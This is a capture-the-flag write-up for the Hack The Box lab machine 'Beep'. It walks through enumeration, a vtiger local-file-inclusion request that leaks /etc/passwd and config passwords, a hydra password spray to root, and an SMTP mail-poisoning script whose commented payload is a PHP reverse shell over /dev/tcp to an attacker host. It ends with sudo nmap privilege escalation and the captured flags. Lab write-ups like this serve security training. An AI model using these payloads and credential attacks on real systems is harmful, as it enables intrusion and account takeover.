{"title":"HTB - Beep","slug":"Beep","html":"<h1 id=\"beep---1010107\">Beep - 10.10.10.7</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.7</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Tue Apr 27 06:07:34 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.7\nNmap scan report for 10.10.10.7\nHost is up (0.24s latency).\nNot shown: 988 closed ports\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)\n| ssh-hostkey: \n|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)\n|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)\n25/tcp    open  smtp       Postfix smtpd\n|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, \n80/tcp    open  http       Apache httpd 2.2.3\n|_http-server-header: Apache/2.2.3 (CentOS)\n|_http-title: Did not follow redirect to https://10.10.10.7/\n110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_pop3-capabilities: PIPELINING UIDL TOP LOGIN-DELAY(0) APOP EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE USER STLS RESP-CODES\n111/tcp   open  rpcbind    2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1            875/udp   status\n|_  100024  1            878/tcp   status\n143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4\n|_imap-capabilities: Completed OK THREAD=REFERENCES NAMESPACE SORT=MODSEQ MULTIAPPEND URLAUTHA0001 MAILBOX-REFERRALS STARTTLS RENAME QUOTA LIST-SUBSCRIBED LISTEXT IMAP4 CHILDREN IDLE ID CONDSTORE LITERAL+ CATENATE BINARY ANNOTATEMORE ATOMIC ACL THREAD=ORDEREDSUBJECT UNSELECT NO RIGHTS=kxte SORT X-NETSCAPE IMAP4rev1 UIDPLUS\n443/tcp   open  ssl/https?\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2017-04-07T08:22:08\n|_Not valid after:  2018-04-07T08:22:08\n|_ssl-date: 2021-04-27T10:18:48+00:00; +7m16s from scanner time.\n993/tcp   open  ssl/imap   Cyrus imapd\n|_imap-capabilities: CAPABILITY\n995/tcp   open  pop3       Cyrus pop3d\n3306/tcp  open  mysql      MySQL (unauthorized)\n|_ssl-cert: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: ERROR: Script execution failed (use -d to debug)\n|_sslv2: ERROR: Script execution failed (use -d to debug)\n|_tls-alpn: ERROR: Script execution failed (use -d to debug)\n|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)\n4445/tcp  open  upnotifyp?\n10000/tcp open  http       MiniServ 1.570 (Webmin httpd)\n|_http-title: Site does not have a title (text/html; Charset=iso-8859-1).\nService Info: Hosts:  beep.localdomain, 127.0.0.1, example.com\n\nHost script results:\n|_clock-skew: 7m15s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Apr 27 06:14:42 2021 -- 1 IP address (1 host up) scanned in 427.79 seconds</code></pre><h2 id=\"website\">Website</h2>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.7/\">http://10.10.10.7/</a>, redirects the attacker to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/\">https://10.10.10.7/</a>.</p>\n<p>What is elastix?</p>\n<p>Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality. It has a Web interface and includes capabilities such as a call center software with predictive dialing.</p>\n<p><img src=\"Beep.assets/image-20210429022801188.png\" alt=\"\"></p>\n<h2 id=\"gobuster\">Gobuster</h2>\n<p>Enumerating the webserver with gobuster.</p>\n<p>Running with <strong>-k</strong> disables checks for tls verification.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">gobuster dir -t 50 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o log/gobuster.out -u https://10.10.10.7 -k</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">/.htpasswd            (Status: 403) [Size: 287]\n/.htaccess            (Status: 403) [Size: 287]\n/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]\n/cgi-bin/             (Status: 403) [Size: 286]\n/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]\n/favicon.ico          (Status: 200) [Size: 894]\n/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]\n/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]\n/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]\n/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]\n/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]\n/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]\n/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]\n/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/]\n/robots.txt           (Status: 200) [Size: 28]\n/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]\n/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]\n/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]\n/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]</code></pre><p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/admin\">https://10.10.10.7/admin</a>, the attacker is prompted by a login page from <strong>FreePBX Administration</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429030531207.png\" alt=\"\"></p>\n<p>Upon Clicking cancel, the attacker is redirected to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/admin/config.php\">https://10.10.10.7/admin/config.php</a>, where the version of FreePBX is revealed to be <strong>2.8.1.4</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429030535503.png\" alt=\"\"></p>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/configs/\">https://10.10.10.7/configs/</a>, directory listings is enable.</p>\n<p><img src=\"Beep.assets/image-20210429031035862.png\" alt=\"\"></p>\n<p>Going to <a target=\"_blank\" rel=\"nofollow\" href=\"https://10.10.10.7/vtigercrm/\">https://10.10.10.7/vtigercrm/</a>, the attacker is presented with a <em>vtiger 5 crm</em> login page.</p>\n<p><img src=\"Beep.assets/image-20210429063246363.png\" alt=\"\"></p>\n<p>Searchsploit is used to search known exploits for:  elastix</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">searchsploit elastix</code></pre><p><img src=\"Beep.assets/image-20210429064303509.png\" alt=\"\"></p>\n<p>A local file inclusion vulnerability is discovered using the command <code>searchsploit -x php/webapps/37637.pl</code></p>\n<p><img src=\"Beep.assets/image-20210429064305972.png\" alt=\"\"></p>\n<h1 id=\"exploitation-method-1\">Exploitation Method 1</h1>\n<h2 id=\"method-1-lfi-and-password-spray-to-root\">Method 1: LFI and Password Spray to Root</h2>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.</p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.exploit-db.com/exploits/37637\">https://www.exploit-db.com/exploits/37637</a></p>\n<h3 id=\"proof-of-concept\">Proof Of Concept</h3>\n<p>The LFI payload from the file *<em>php/webapps/37637.pl *</em> is tested manually using burp.</p>\n<p><img src=\"Beep.assets/image-20210429065104719.png\" alt=\"\"></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">AMPDBHOST=localhost\nAMPDBENGINE=mysql\n# AMPDBNAME=asterisk\nAMPDBUSER=asteriskuser\n# AMPDBPASS=amp109\nAMPDBPASS=jEhdIekWmdjE\nAMPENGINE=asterisk\nAMPMGRUSER=admin\n#AMPMGRPASS=amp111\nAMPMGRPASS=jEhdIekWmdjE</code></pre><h3 id=\"getting-a-shell\">Getting a shell</h3>\n<p>The following request can be used to get a list of users having a shell from <strong>/etc/passwd</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">GET /vtigercrm/graph.php?current_language=../../../../../../../../../etc/passwd%00&amp;module=Accounts&amp;action= HTTP/1.1\nHost: 10.10.10.7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</code></pre><p>Once the content of the passwd file is saved to a file, all the users can be easily </p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat passwd | grep \"bash\" | awk -F\\: '{print $1}' > users</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">root\nmysql\ncyrus\nasterisk\nspamfilter\nfanis</code></pre><p>A password file can be generated using the initial payload file.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat tmp | awk -F\\= '{print $2}' | sort -u > password</code></pre><pre class=\"language-bash\"><code class=\"language-bash\">admin\namp109\namp111\nasterisk\nasteriskuser\njEhdIekWmdjE\nlocalhost\nmysql</code></pre><p>A password spray attack using hydra can now be used with the list of users and password.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">hydra -L users -P password ssh://10.10.10.7 -t 4\n[ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE</code></pre><p>The attacker can now successfully login as the <strong>root</strong> user using th credentials <code>root:jEhdIekWmdjE</code>.</p>\n<p>However while logging in using ssh, an error is preventing the attacker from logging in.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ ssh root@10.10.10.7\nUnable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</code></pre><p>After researching the issue, a solution was provided on <a target=\"_blank\" rel=\"nofollow\" href=\"https://unix.stackexchange.com/questions/402746/ssh-unable-to-negotiate-no-matching-key-exchange-method-found\">https://unix.stackexchange.com/questions/402746/ssh-unable-to-negotiate-no-matching-key-exchange-method-found</a>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc </code></pre><p>After using the ssh command above, the attacker can successfully login to the system.</p>\n<h1 id=\"exploitation-method-2\">Exploitation Method 2</h1>\n<h2 id=\"method-2-smtp-to-low-privilege-shell\">Method 2: SMTP To Low Privilege Shell</h2>\n<h3 id=\"vulnerability-explanation-1\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Since <strong>SMTP</strong> is being used, if a user has a mail account configured, it can be accessed on the user&#39;s mail location <strong>/var/mail/user</strong>. The attacker can mail a user, a php payload, and then read the mail location using the local file inclusion to execute the php payload on the webserver.</p>\n<p>The enumeration steps can be followed from here: <a target=\"_blank\" rel=\"nofollow\" href=\"https://book.hacktricks.xyz/pentesting/pentesting-smtp\">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">telnet 10.10.10.7 25\n...[snip]...\n220 beep.localdomain ESMTP Postfix\nEHLO anubhav@locahost.com \n# EHLO = Enhanced Hello is used to identify the attacker with the server\n...[snip]...\nVRFY asterisk@localhost\n252 2.0.0 asterisk@localhost\n# VRFY = Verify is used to check if a user exist</code></pre><p><img src=\"Beep.assets/image-20210429093138445.png\" alt=\"\"></p>\n<p>The user asterisk is chosen as he was already included in the telephony backend engine from the LFI vulnerabilty.</p>\n<pre class=\"language-python\"><code class=\"language-python\">from email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nimport smtplib\nimport sys\n\nlhost = \"127.0.0.1\"\nlport = 443\nrhost = \"10.10.10.7\"\nrport = 25 # 489,587\n\n# create message object instance\nmsg = MIMEMultipart()\n\n# setup the parameters of the message\npassword = \"\" \nmsg['From'] = \"anubhav@localhost\"\nmsg['To'] = \"asterisk@localhost\"\nmsg['Subject'] = \"This is not a drill!\"\n\n# payload \n# message = (\"<span class=\"token prolog\">&lt;?php system('bash -i >&amp; /dev/tcp/%s/%d 0>&amp;1'); ?></span>\" % (lhost,lport))\nmessage = ('<span class=\"token prolog\">&lt;?php echo(\"test test test\"); ?></span>')\n\nprint(\"[*] Payload is generated : %s\" % message)\n\nmsg.attach(MIMEText(message, 'plain'))\nserver = smtplib.SMTP(host=rhost,port=rport)\n\nif server.noop()[0] != 250:\n    print(\"[-]Connection Error\")\n    exit()\n\n# server.starttls()\n\n# Uncomment if log-in with authencation\n# server.login(msg['From'], password)\n\nserver.sendmail(msg['From'], msg['To'], msg.as_string())\nserver.quit()\n\nprint(\"[***]successfully sent email to %s:\" % (msg['To']))</code></pre><p>The script is modified to display <strong>&quot;test test test&quot;</strong> instead of getting the reverse shell directly. This is done in order to check whether the script is working properly or not.</p>\n<p><img src=\"Beep.assets/image-20210429092550027.png\" alt=\"\"></p>\n<p>As can be seen above, the text &quot;test test test&quot; is being printed, hence the php payload got executed.</p>\n<p>The script can now be modified to get a reverse shell and the attacker starts to listen on port <strong>8888</strong>.</p>\n<p><img src=\"Beep.assets/image-20210429093007417.png\" alt=\"\"></p>\n<p>Once the script is ran, the LFI vulnerabilty is used to read the user <strong>asterisk</strong> mail content, and a reverse shell connection is obtained.</p>\n<p><img src=\"Beep.assets/image-20210429093521602.png\" alt=\"\"></p>\n<p>It is a good sign that there is no response on burp as the page will hang if it is connected to the netcat session.<img src=\"Beep.assets/image-20210429093541822.png\" alt=\"\"></p>\n<p>A reverse shell as the user <strong>asterisk</strong> from the server is obtained .</p>\n<p><img src=\"Beep.assets/image-20210429093742595.png\" alt=\"\"></p>\n<p><img src=\"Beep.assets/image-20210429094839741.png\" alt=\"\"></p>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>Running the command <code>sudo -l</code>, the attacker can know which commands can be run as root without password from the current user.</p>\n<p>Nmap has a known privilege escalation technique, when run with the <strong>--interactive</strong> flag, it can drop a shell when <code>!sh</code> is ran in the prompt.</p>\n<p><img src=\"Beep.assets/image-20210429095234711.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null</code></pre><p><strong>User.txt</strong> can be found in the home directory of <strong>fanis</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/fanis/user.txt</code></pre><p><img src=\"Beep.assets/image-20210429081050948.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>e0492fb5a4a0ae34aac2c723e1a0db45</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Beep.assets/image-20210429081222144.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>61af6c4db62d6f8902fe1169ed35bf10</code></p>\n</blockquote>\n","date":"2021-04-28","excerpt":"","printDate":"April 28, 2021","printReadingTime":"8 min read"}